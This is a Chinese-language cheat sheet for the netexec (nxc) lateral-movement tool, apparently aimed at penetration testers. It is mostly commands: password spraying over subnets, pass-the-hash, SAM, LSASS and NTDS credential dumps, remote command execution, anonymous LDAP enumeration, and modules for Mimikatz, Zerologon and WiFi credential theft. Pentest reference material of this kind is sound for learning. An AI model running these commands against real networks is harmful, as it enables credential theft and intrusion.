# netexec (nxc) 基础用法

netexec（社区接管的 crackmapexec 替代）是 AD/内网横向移动的瑞士军刀。一行命令就能批量验证 CIDR 上所有 SMB / WinRM / RDP / SSH / MSSQL / LDAP 凭据，并联动 80+ 个内置模块做 LSASS dump、Mimikatz、share spider 等。

## 安装

```bash
pipx install netexec                # 推荐（隔离环境）
pip install netexec                  # 直接安装
```

验证：

```bash
nxc --version                        # 注意是 nxc，不是 netexec
```

## 命令骨架

```
nxc <protocol> <targets> [auth] [options]
```

| 协议 | 默认端口 | 用途 |
|---|---|---|
| `smb` | 445 | SMB 验证 / 共享 / dump |
| `winrm` | 5985/5986 | WinRM 远程执行 |
| `rdp` | 3389 | RDP 验证 |
| `ssh` | 22 | SSH 验证 |
| `mssql` | 1433 | MSSQL 验证 / 命令 |
| `ldap` | 389/636 | LDAP 枚举 |
| `wmi` | DCOM | WMI 执行 |
| `nfs` | 2049 | NFS 共享 |
| `vnc` | 5900 | VNC 验证 |

## 最简 SMB 喷洒

```bash
nxc smb 192.168.1.0/24 -u admin -p Password123
```

成功用绿色 `[+]` 标，半成功（密码对但权限低）用蓝色 `(Pwn3d!)` 标。

## 常见认证方式

| 形式 | 命令 |
|---|---|
| 用户名 + 密码 | `-u admin -p Pass` |
| 用户列表 + 密码 | `-u users.txt -p Pass` |
| 密码喷洒 | `-u admin -p passes.txt --continue-on-success` |
| Pass-the-Hash | `-u admin -H aad3...:8846f...` |
| Kerberos ccache | `--use-kcache` |
| 域 vs 本地 | 加 `-d lab.local` 或 `--local-auth` |

注意：**`--continue-on-success`** 是密码喷洒必备，不然找到一个就停。

## 共享枚举

```bash
nxc smb 10.0.0.0/24 -u admin -p Pass --shares
```

## SAM dump（admin 权限）

```bash
nxc smb 10.0.0.5 -u admin -p Pass --sam
```

## LSASS dump（lsassy 模块）

```bash
nxc smb 10.0.0.0/24 -u admin -p Pass -M lsassy
```

模块默认路径自动选择，输出 NTLM 哈希。

## NTDS dump（DC 上）

```bash
nxc smb 10.0.0.10 -u admin -p Pass --ntds
```

## 远程执行

```bash
nxc smb 10.0.0.5 -u admin -p Pass -x "whoami"
nxc winrm 10.0.0.5 -u admin -p Pass -x "ipconfig"
nxc wmi 10.0.0.5 -u admin -p Pass -x "tasklist"
```

## LDAP 枚举（无凭据）

```bash
nxc ldap dc01.lab.local -u '' -p '' --users
nxc ldap dc01.lab.local -u '' -p '' --groups
nxc ldap dc01.lab.local -u '' -p '' --pass-pol
```

## 模块清单

```bash
nxc smb -L                           # 列 SMB 协议下的所有模块
nxc smb -M spider_plus --options     # 看模块选项
```

常用模块：

| 模块 | 用途 |
|---|---|
| `lsassy` | LSASS dump |
| `mimikatz` | Mimikatz over SMB |
| `spider_plus` | 共享递归爬取 |
| `ms17-010` | 永恒之蓝检查 |
| `petitpotam` | PetitPotam 触发 |
| `printnightmare` | PrintNightmare 检查 |
| `zerologon` | Zerologon 检查 |
| `enum_av` | 枚举 AV |
| `enum_dns` | DNS 信息 |
| `gpp_password` | GPP 密码 |
| `wireless` | 抽 WiFi 凭据 |

## 数据库（自动保存到 ~/.nxc/）

```bash
nxc smb workspace
nxc smb workspace -L                 # 列 workspace
nxc smb workspace -M create x        # 新建
nxc smb workspace --use x            # 切换
```

## 常见坑

- `nxc` ≠ 老的 `cme` —— 老命令兼容，但建议用 `nxc`
- 喷洒前一定查域密码策略 `--pass-pol`，避免锁号
- pipx 装的 nxc 找不到 `lsassy`/`dploot` 等可选模块时 `pipx inject netexec lsassy dploot`
- 跑 ldap 模块时若开了 LDAP 签名/通道绑定，加 `--ldap-channel-binding`
